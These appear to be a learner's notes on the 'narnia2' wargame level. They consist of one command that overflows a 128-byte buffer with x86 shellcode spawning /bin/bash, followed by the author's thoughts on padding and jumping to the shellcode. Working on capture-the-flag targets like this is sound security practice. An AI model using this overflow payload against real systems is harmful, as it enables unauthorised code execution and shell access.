./narnia2 `python -c 'print("A" * 128 + "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43")'`

I may need to put shellcode in the first print section, then pad out my input, then execute a JMP to the first part of my shellcode. I need to figure out what's getting executed when I overflow the character buffer.
